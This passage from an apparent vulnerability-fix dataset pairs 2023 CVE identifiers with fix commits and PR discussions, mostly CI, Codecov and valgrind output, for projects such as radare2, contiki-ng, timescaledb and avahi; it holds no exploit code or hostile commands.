amd64 part 5\n- Ubuntu 20.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 2\n- Topotests Ubuntu 18.04 i386 part 1\n- Topotests Ubuntu 18.04 i386 part 6\n- Topotests Ubuntu 18.04 amd64 part 4\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 amd64 part 9\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests Ubuntu 18.04 i386 part 8\n- Addresssanitizer topotests part 3\n- Debian 10 deb pkg check\n- Addresssanitizer topotests part 7\n- Topotests debian 10 amd64 part 0\n- Topotests Ubuntu 18.04 amd64 part 7\n- Addresssanitizer topotests part 6\n- Topotests Ubuntu 18.04 i386 part 0\n- Topotests Ubuntu 18.04 i386 part 5\n- Topotests debian 10 amd64 part 1\n- Topotests Ubuntu 18.04 arm8 part 5\n- CentOS 7 rpm pkg check\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 i386 part 9\n- Topotests debian 10 amd64 part 2\n- Topotests Ubuntu 18.04 amd64 part 8\n- Static analyzer (clang)\n- Addresssanitizer topotests part 2\n- Debian 9 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests debian 10 amd64 part 5\n- Ubuntu 18.04 deb pkg check\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 arm8 part 6\n- Addresssanitizer topotests part 8\n- Topotests debian 10 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 amd64 part 6\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests Ubuntu 18.04 arm8 part 8\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nTest incomplete. See below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13680/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Incomplete\n<details><summary>Addresssanitizer topotests part 4: Incomplete</summary>\n(check logs for details)</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 3: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 i386 part 3: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13680/artifact/TOPO3U18I386/TopotestDetails/\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO3U18I386-13680/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 3__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-13680/artifact/TOPO3U18I386/TopotestLogs/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 9: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO9U18I386-13680/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 9__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-13680/artifact/TOPO9U18I386/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 i386 part 9: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13680/artifact/TOPO9U18I386/TopotestDetails/\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 arm8 part 3\n- Topotests debian 10 amd64 part 9\n- Addresssanitizer topotests part 5\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 amd64 part 3\n- Topotests debian 10 amd64 part 8\n- Addresssanitizer topotests part 0\n- Topotests Ubuntu 18.04 arm8 part 4\n- Topotests debian 10 amd64 part 3\n- Topotests Ubuntu 18.04 arm8 part 9\n- Topotests debian 10 amd64 part 0\n- Topotests Ubuntu 18.04 amd64 part 5\n- Ubuntu 20.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 2\n- Topotests Ubuntu 18.04 i386 part 1\n- Topotests Ubuntu 18.04 amd64 part 8\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 i386 part 6\n- Topotests Ubuntu 18.04 i386 part 8\n- Topotests Ubuntu 18.04 amd64 part 9\n- Topotests Ubuntu 18.04 arm8 part 7\n- Debian 10 deb pkg check\n- Addresssanitizer topotests part 7\n- Topotests Ubuntu 18.04 amd64 part 7\n- Addresssanitizer topotests part 6\n- Topotests Ubuntu 18.04 i386 part 5\n- Topotests Ubuntu 18.04 i386 part 0\n- Addresssanitizer topotests part 3\n- Topotests debian 10 amd64 part 1\n- Topotests Ubuntu 18.04 arm8 part 5\n- CentOS 7 rpm pkg check\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests debian 10 amd64 part 2\n- Addresssanitizer topotests part 2\n- Static analyzer (clang)\n- Debian 9 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 1\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Ubuntu 18.04 deb pkg check\n- Topotests debian 10 amd64 part 5\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 arm8 part 6\n- Addresssanitizer topotests part 8\n- Topotests debian 10 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 8\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests Ubuntu 18.04 amd64 part 6\n</details>\n\n</details> # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13680/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.",
            "pr_title_words": 9,
            "comments_words": 1497,
            "total_other_info_words": 1506
        },
        {
            "cve-id": "CVE-2023-47016",
            "commit_url": "https://github.com/radareorg/radare2/commit/40c9f50e127be80b9d816bce2ab2ee790831aefd",
            "commit_msg": "Fix #22349 - oobread in xnu kernelcache ##crash\n\n* Reproducer rabin_hbo_194\n* Reported by @gandalf4a",
            "commit_msg_words": 15,
            "other_info": "Fix #22349 - oobread in xnu kernelcache ##crash",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2023-37281",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/b8d0228d3b9b3d65fa0544359febdfd5ec3b04d3",
            "commit_msg": "Add packet boundary checks when decompressing IP addresses.",
            "commit_msg_words": 8,
            "other_info": "sicslowpan: Add packet boundary checks when decompressing IP addresses. Hi!\r\n\r\nThis was my mistake, very sorry about it, re-opening this PR now.\r\n\r\nWhat happened is the following: I was switching the base branch for this repository https://github.com/wittra/contiki-ng from develop to wittra. But accidentally, I made the change on the wrong repo (this repo) and instead of switching the base branch I renamed it. And somehow github deleted develop and closed all PRs...\r\n\r\nMany apologies for this mishap \ud83d\ude4f; I haven't contributed in a while.. but now at least everybody got some notification from me :p This PR downgraded Cooja, fixed with #2635. Sorry for the accidental downgrade!",
            "pr_title_words": 9,
            "comments_words": 98,
            "total_other_info_words": 107
        },
        {
            "cve-id": "CVE-2023-25149",
            "commit_url": "https://github.com/timescale/timescaledb/commit/014b40fb7e8d59087cf1c1988a68dd1979f86cb3",
            "commit_msg": "Lock down search_path in SPI calls",
            "commit_msg_words": 6,
            "other_info": "Lock down search_path in SPI calls @fabriziomello, @lkshminarayanan: please review this pull request.\n\n> Powered by [pull-review](https://github.com/imsky/pull-review) # [Codecov](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale) Report\n> Merging [#5259](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale) (eb03a09) into [main](https://codecov.io/gh/timescale/timescaledb/commit/f75a51def79796ff7fef58ec950c859fe4e71618?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale) (f75a51d) will **decrease** coverage by `26.20%`.\n> The diff coverage is `25.00%`.\n\n> :exclamation: Current head eb03a09 differs from pull request most recent head 014b40f. Consider uploading reports for the commit 014b40f to get more accurate results\n\n[![Impacted file tree graph](https://codecov.io/gh/timescale/timescaledb/pull/5259/graphs/tree.svg?width=650&height=150&src=pr&token=l8YarD17Yo&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale)](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale)\n\n```diff\n@@             Coverage Diff             @@\n##             main    #5259       +/-   ##\n===========================================\n- Coverage   89.03%   62.84%   -26.20%     \n===========================================\n  Files         225      225               \n  Lines       51822    45658     -6164     \n===========================================\n- Hits        46142    28694    -17448     \n- Misses       5680    16964    +11284     \n```\n\n\n| [Impacted Files](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale) | Coverage \u0394 | |\n|---|---|---|\n| [src/hypertable.c](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale#diff-c3JjL2h5cGVydGFibGUuYw==) | `44.33% <\u00f8> (-42.94%)` | :arrow_down: |\n| [src/telemetry/telemetry.c](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale#diff-c3JjL3RlbGVtZXRyeS90ZWxlbWV0cnkuYw==) | `3.87% <0.00%> (-81.81%)` | :arrow_down: |\n| [tsl/src/continuous\\_aggs/materialize.c](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale#diff-dHNsL3NyYy9jb250aW51b3VzX2FnZ3MvbWF0ZXJpYWxpemUuYw==) | `58.55% <0.00%> (-11.45%)` | :arrow_down: |\n| [src/telemetry/replication.c](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale#diff-c3JjL3RlbGVtZXRyeS9yZXBsaWNhdGlvbi5j) | `85.00% <66.66%> (-5.00%)` | :arrow_down: |\n| [src/chunk.h](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale#diff-c3JjL2NodW5rLmg=) | `0.00% <0.00%> (-100.00%)` | :arrow_down: |\n| [src/chunk\\_index.h](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale#diff-c3JjL2NodW5rX2luZGV4Lmg=) | `0.00% <0.00%> (-100.00%)` | :arrow_down: |\n| [tsl/src/remote/data\\_fetcher.h](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale#diff-dHNsL3NyYy9yZW1vdGUvZGF0YV9mZXRjaGVyLmg=) | `0.00% <0.00%> (-100.00%)` | :arrow_down: |\n| [tsl/src/compression/dictionary\\_hash.h](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale#diff-dHNsL3NyYy9jb21wcmVzc2lvbi9kaWN0aW9uYXJ5X2hhc2guaA==) | `0.00% <0.00%> (-100.00%)` | :arrow_down: |\n| [tsl/src/compression/simple8b\\_rle.h](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale#diff-dHNsL3NyYy9jb21wcmVzc2lvbi9zaW1wbGU4Yl9ybGUuaA==) | `0.00% <0.00%> (-96.57%)` | :arrow_down: |\n| [src/scanner.c](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale#diff-c3JjL3NjYW5uZXIuYw==) | `0.00% <0.00%> (-94.10%)` | :arrow_down: |\n| ... and [205 more](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale) | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=footer&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale). Last update [f75a51d...014b40f](https://codecov.io/gh/timescale/timescaledb/pull/5259?src=pr&el=lastupdated&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=timescale).\n Automated backport to 2.9.x not done: cherry-pick failed.\r\n\r\n(that's my robot self talking) Automated backport to 2.9.x not done: cherry-pick failed.\n\n[Job log](https://github.com/timescale/timescaledb/actions/runs/4065592607/attempts/1) Automated backport to 2.9.x not done: cherry-pick failed.\n\n### Git status\n\nHEAD detached at origin/2.9.x\nYou are currently cherry-picking commit 789bb26d.\n  (fix conflicts and run \"git cherry-pick --continue\")\n  (use \"git cherry-pick --skip\" to skip this patch)\n  (use \"git cherry-pick --abort\" to cancel the cherry-pick operation)\n\nChanges to be committed:\n\tmodified:   src/hypertable.c\n\tmodified:   src/telemetry/replication.c\n\tmodified:   src/telemetry/telemetry.c\n\tmodified:   tsl/src/continuous_aggs/materialize.c\n\tmodified:   tsl/src/continuous_aggs/refresh.c\n\tmodified:   tsl/src/reorder.c\n\nUnmerged paths:\n  (use \"git add <file>...\" to mark resolution)\n\tboth modified:   CHANGELOG.md\n\n\n\n[Job log](https://github.com/timescale/timescaledb/actions/runs/4065903293/attempts/1)",
            "pr_title_words": 6,
            "comments_words": 342,
            "total_other_info_words": 348
        },
        {
            "cve-id": "CVE-2023-28867",
            "commit_url": "https://github.com/graphql-java/graphql-java/commit/8a1c884c81c0b656db201cfd95881feb0f430a55",
            "commit_msg": "Preventing stack overflow exceptions via limiting the depth of the parser rules",
            "commit_msg_words": 12,
            "other_info": "Preventing stack overflow exceptions via limiting the depth of the parser rules",
            "pr_title_words": 12,
            "comments_words": 0,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2023-30546",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/406ae7da30fb5fadacf0d646a4dc4ac0513a2dec",
            "commit_msg": "antelope,storage-cfs: Fix length of filename array",
            "commit_msg_words": 6,
            "other_info": "antelope,storage-cfs: Fix length of filename array This looks like a off-by-one-byte error. Should there be a CVE for this? (@nvt) @Machiry Yes, it might get a CVE, but it is difficult to exploit the bug without direct access to the DBMS; e.g., by being able to inject shell commands into the IoT node. I agree about the exploitability. But given that this is in a storage stack, it is better to have a CVE (may be a low-severity).",
            "pr_title_words": 6,
            "comments_words": 72,
            "total_other_info_words": 78
        },
        {
            "cve-id": "CVE-2023-25824",
            "commit_url": "https://github.com/airtower-luna/mod_gnutls/commit/d7eec4e598158ab6a98bf505354e84352f9715ec",
            "commit_msg": "Fix loop in blocking read on transport timeout\n\nThe loop was cased by an incorrect errno if the transport read in\nmgs_transport_read() fails with an APR TIMEUP status, as happens when\nmod_reqtimeout limits are exceeded. Setting the transport errno to\nEGAIN meant that a blocking read would be retried endlessly, setting\nETIMEDOUT instead makes the read fail as it should.\n\nThe bug was introduced in commit 92cb0cca41af946055307e373b6ab6d76d34f356,\nfirst release to include it was 0.9.0.\n\nMany thanks to F\u00e9lix Arreola Rodr\u00edguez for the detailed analysis [1]\non the Debian bug tracker!\n\n[1] https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=942737#25",
            "commit_msg_words": 92,
            "other_info": "Fix loop in blocking read on transport timeout",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2023-26266",
            "commit_url": "https://github.com/AFLplusplus/AFLplusplus/commit/f2be73186e2e16c3992f92b65ae9ba598d6fff2f",
            "commit_msg": "cmplog exec with target_path",
            "commit_msg_words": 4,
            "other_info": "Cmplog should search for unprefixed target in PATH, not PWD thanks for the PR, letting the CI check this ... :) the version below 4.05c is also affected by this vulnerability? It's not a vulnerability but I see it in the NVD reference whose CVEID is CVE-2023-26266.\r\nBesides, in other words, the version below 4.05c is also affected by this bug? look up when that code change came in and you have your answer.\r\nIMHO it is a security vuln but a minor. far away from a crit.\r\nan attacker needs to be on your system and have write access in your current working directory and that is where you want to fuzz. one could say you are already fucked when that comes together.\r\n\r\nplus what the real problem is - cmplog wasnt working because of that change. so the fix was to make it working again, not to fix this \"vuln\" Oooof what, 9.8 critical? xD > Oooof what, 9.8 critical? xD\r\n\r\nWhat does it mean? It means it's totally overrated",
            "pr_title_words": 10,
            "comments_words": 162,
            "total_other_info_words": 172
        },
        {
            "cve-id": "CVE-2023-27590",
            "commit_url": "https://github.com/rizinorg/rizin/commit/d6196703d89c84467b600ba2692534579dc25ed4",
            "commit_msg": "Fix conversion from GDB register profile to rizin profile",
            "commit_msg_words": 9,
            "other_info": "Fix conversion from GDB register profile to rizin profile ```\r\nTranslation unit diagnostic at <rizin/librz/debug/p/debug_gdb.c:221:4>: 'sscanf' may overflow; destination buffer in argument 3 has size 99, but the corresponding specifier may require size 101\r\n```",
            "pr_title_words": 9,
            "comments_words": 26,
            "total_other_info_words": 35
        },
        {
            "cve-id": "CVE-2023-49299",
            "commit_url": "https://github.com/apache/dolphinscheduler/commit/d1ef54f6a851e64525f1078887520394e553b6e8",
            "commit_msg": "fix switch condition",
            "commit_msg_words": 3,
            "other_info": "[Bug] fix switch condition ## [Codecov](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15228?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) Report\nAttention: `18 lines` in your changes are missing coverage. Please review.\n> Comparison is base [(`12f8138`)](https://app.codecov.io/gh/apache/dolphinscheduler/commit/12f8138167f8481f66d52775b510457f532b56e4?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) 37.99% compared to head [(`2c8088f`)](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15228?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) 38.02%.\n\n> :exclamation: Current head 2c8088f differs from pull request most recent head f8a412f. Consider uploading reports for the commit f8a412f to get more accurate results\n\n| [Files](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15228?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) | Patch % | Lines |\n|---|---|---|\n| [...master/runner/task/switchtask/SwitchLogicTask.java](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15228?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache#diff-ZG9scGhpbnNjaGVkdWxlci1tYXN0ZXIvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvc2VydmVyL21hc3Rlci9ydW5uZXIvdGFzay9zd2l0Y2h0YXNrL1N3aXRjaExvZ2ljVGFzay5qYXZh) | 0.00% | [10 Missing :warning: ](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15228?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) |\n| [...scheduler/server/master/utils/SwitchTaskUtils.java](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15228?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache#diff-ZG9scGhpbnNjaGVkdWxlci1tYXN0ZXIvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvc2VydmVyL21hc3Rlci91dGlscy9Td2l0Y2hUYXNrVXRpbHMuamF2YQ==) | 69.23% | [3 Missing and 5 partials :warning: ](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15228?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) |\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@             Coverage Diff              @@\n##                dev   #15228      +/-   ##\n============================================\n+ Coverage     37.99%   38.02%   +0.03%     \n- Complexity     4640     4645       +5     \n============================================\n  Files          1279     1279              \n  Lines         44490    44500      +10     \n  Branches       4794     4797       +3     \n============================================\n+ Hits          16902    16923      +21     \n+ Misses        25733    25717      -16     \n- Partials       1855     1860       +5     \n```\n\n\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15228?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache).\n Kudos, SonarCloud Quality Gate passed!&nbsp; &nbsp; [![Quality Gate passed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/passed-16px.png 'Quality Gate passed')](https://sonarcloud.io/dashboard?id=apache-dolphinscheduler&pullRequest=15228)\n\n[![Bug](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/bug-16px.png 'Bug')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=BUG) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=BUG) [0 Bugs](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=BUG)  \n[![Vulnerability](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/vulnerability-16px.png 'Vulnerability')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=VULNERABILITY) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=VULNERABILITY) [0 Vulnerabilities](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=VULNERABILITY)  \n[![Security Hotspot](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/security_hotspot-16px.png 'Security Hotspot')](https://sonarcloud.io/project/security_hotspots?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=SECURITY_HOTSPOT) [![E](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/E-16px.png 'E')](https://sonarcloud.io/project/security_hotspots?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=SECURITY_HOTSPOT) [1 Security Hotspot](https://sonarcloud.io/project/security_hotspots?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=SECURITY_HOTSPOT)  \n[![Code Smell](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/code_smell-16px.png 'Code Smell')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=CODE_SMELL) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=CODE_SMELL) [5 Code Smells](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=15228&resolved=false&types=CODE_SMELL)\n\n[![63.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/CoverageChart/60-16px.png '63.0%')](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=15228&metric=new_coverage&view=list) [63.0% Coverage](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=15228&metric=new_coverage&view=list)  \n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/Duplications/3-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=15228&metric=new_duplicated_lines_density&view=list) [0.0% Duplication](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=15228&metric=new_duplicated_lines_density&view=list)",
            "pr_title_words": 4,
            "comments_words": 205,
            "total_other_info_words": 209
        },
        {
            "cve-id": "CVE-2023-1981",
            "commit_url": "https://github.com/avahi/avahi/commit/a2696da2f2c50ac43b6c4903f72290d5c3fa9f6f",
            "commit_msg": "Emit error if requested service is not found\n\nIt currently just crashes instead of replying with error. Check return\nvalue and emit error instead of passing NULL pointer to reply.\n\nFixes #375",
            "commit_msg_words": 32,
            "other_info": "Emit error if Dbus requested service is not found Looks like `avahi` no longer crashes. Thanks! `valgrind` reports a bunch of memory leaks though\r\n<details>\r\n  <summary>definitely lost: 336 bytes in 4 blocks</summary>\r\n\r\n```sh\r\n==66838== 80 bytes in 1 blocks are definitely lost in loss record 11 of 28\r\n==66838==    at 0x484586F: malloc (vg_replace_malloc.c:381)\r\n==66838==    by 0x4863754: xmalloc (malloc.c:68)\r\n==66838==    by 0x4863754: avahi_malloc (malloc.c:107)\r\n==66838==    by 0x4863A24: avahi_strdup_vprintf (malloc.c:206)\r\n==66838==    by 0x4863B70: avahi_strdup_printf (malloc.c:242)\r\n==66838==    by 0x407780: drop_root (main.c:1395)\r\n==66838==    by 0x407780: main (main.c:1651)\r\n==66838==\r\n==66838== 80 bytes in 1 blocks are definitely lost in loss record 12 of 28\r\n==66838==    at 0x484586F: malloc (vg_replace_malloc.c:381)\r\n==66838==    by 0x4863754: xmalloc (malloc.c:68)\r\n==66838==    by 0x4863754: avahi_malloc (malloc.c:107)\r\n==66838==    by 0x4863A24: avahi_strdup_vprintf (malloc.c:206)\r\n==66838==    by 0x4863B70: avahi_strdup_printf (malloc.c:242)\r\n==66838==    by 0x40779C: drop_root (main.c:1396)\r\n==66838==    by 0x40779C: main (main.c:1651)\r\n==66838==\r\n==66838== 80 bytes in 1 blocks are definitely lost in loss record 13 of 28\r\n==66838==    at 0x484586F: malloc (vg_replace_malloc.c:381)\r\n==66838==    by 0x4863754: xmalloc (malloc.c:68)\r\n==66838==    by 0x4863754: avahi_malloc (malloc.c:107)\r\n==66838==    by 0x4863A24: avahi_strdup_vprintf (malloc.c:206)\r\n==66838==    by 0x4863B70: avahi_strdup_printf (malloc.c:242)\r\n==66838==    by 0x4077B9: drop_root (main.c:1397)\r\n==66838==    by 0x4077B9: main (main.c:1651)\r\n==66838==\r\n==66838== 551 (96 direct, 455 indirect) bytes in 1 blocks are definitely lost in loss record 26 of 28\r\n==66838==    at 0x484586F: malloc (vg_replace_malloc.c:381)\r\n==66838==    by 0x4863754: xmalloc (malloc.c:68)\r\n==66838==    by 0x4863754: avahi_malloc (malloc.c:107)\r\n==66838==    by 0x40D876: avahi_init_proc_title (setproctitle.c:68)\r\n==66838==    by 0x4074F1: main (main.c:1564)\r\n```\r\n</details>\r\n\r\nbut it seems they have nothing to do with this PR.\r\n\r\nOn a somewhat related note I thought `avahi` was abandoned (and my guess would be that among other things PRs like https://github.com/systemd/systemd/pull/22532 were opened to integrate more mdns stuff into systemd-resolved to avoid bringing abandoned and unmaintained components to new products/devices). I wonder if anything has changed? Looking at https://github.com/lathiat/avahi/issues/388 it appears it isn't exactly abandoned anymore but it it isn't clear (to me at least) where it's going either. The problem is there are volunteers willing to maintain the code, because current maintainer spends very little time on this project. But some fixes are sometime pushed. I think we have people willing to collaborate. The only question is if other people can be given permission to commit into repository and mark issues here. Or we should fork the project and maintain common repository elsewhere. I guess it depends on the decision of @lathiat. I haven't seen any public statement, positive or negative. Got it. Thanks!\r\n\r\nI think it would be great if it was possible to resurrect avahi somehow. It would take a lot of time to even cover the `mdns` part of `systemd-resolved` with basic tests (not to mention tests that can start catching (and preventing) issues like https://github.com/systemd/systemd/issues/23873 and https://github.com/systemd/systemd/issues/23894) so in my opinion generally that time would be better spent on improving `avahi` (which already works and 